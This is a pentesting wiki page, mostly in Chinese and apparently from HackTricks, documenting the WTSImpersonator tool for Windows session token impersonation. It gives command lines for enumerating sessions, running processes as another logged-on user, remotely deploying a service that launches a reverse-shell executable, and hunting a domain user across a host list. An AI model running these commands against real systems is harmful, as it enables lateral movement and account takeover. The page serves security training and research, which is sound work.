# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator** 由 Omri Baso 开发，通过 `\\pipe\LSM_API_service` RPC named pipe 使用 Windows Terminal Services APIs，枚举已登录的会话，并使用所选用户的 token 启动进程。它支持本地枚举和执行，以及基于远程 service 的工作流。<sup>[[1]](#references)</sup>

## Core functionality

其本地执行流程使用以下 API sequence：<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## 模块和用法

- **枚举用户：**该工具可以枚举本地主机或远程主机上的会话。

- 本地：
```bash
.\WTSImpersonator.exe -m enum
```
- 远程使用时，指定 IP 地址或主机名：
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **执行命令：**`exec` 和 `exec-remote` 模块需要服务上下文。Microsoft 文档说明，`WTSQueryUserToken` 要求调用方以 `LocalSystem` 身份运行，并具有 `SE_TCB_NAME` 权限。<sup>[[2]](#references)</sup>

- 本地命令执行：
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec 可以启动一个 `LocalSystem` 命令提示符进行测试：
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **远程命令执行：**远程模式会以类似 PsExec 的工作流在目标主机上创建服务，因此需要安装并启动该服务的权限。<sup>[[1]](#references)</sup>

- 示例：
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **用户 hunting：**`user-hunter` 模块会在主机列表中搜索指定用户的会话，并尝试在该上下文中执行所提供的程序。<sup>[[1]](#references)</sup>
- 用法示例：
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft：`WTSQueryUserToken` 函数](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
